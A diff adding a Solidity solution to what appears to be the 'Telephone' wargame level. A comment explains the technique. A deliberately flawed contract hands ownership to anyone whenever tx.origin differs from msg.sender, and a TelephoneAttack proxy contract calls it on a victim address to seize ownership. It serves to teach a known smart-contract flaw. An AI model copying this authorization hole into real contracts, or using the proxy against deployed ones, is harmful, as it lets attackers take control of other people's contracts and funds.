@@ -1,0 +1,40 @@
+    /**
+     * To be Telephone contract's owner, the address that calls changeOwner
+     * should be different from the address that originates the transaction.
+     * That means that the attacker cannot call changeOwner directly
+     * because tx.origin would be equal to msg.sender.
+     * 
+     * The solution is to call a "proxy" contract in charge of actually calling
+     * the changeOwner function of the victim contract. That way, tx.origin would be
+     * the attacker address, while msg.sender would be the address of the "proxy" contract.
+     */
+
+     pragma solidity ^0.4.18;
+
+contract Telephone {
+
+  address public owner;
+
+  function Telephone() public {
+    owner = msg.sender;
+  }
+
+  function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+  
+}
+
+contract TelephoneAttack {
+    Telephone public victimContract;
+
+    function setVictim(address _addr) public {
+        victimContract = Telephone(_addr);
+    }
+
+    function changeOwner(address _owner) public {
+        victimContract.changeOwner(_owner);
+    }
+}
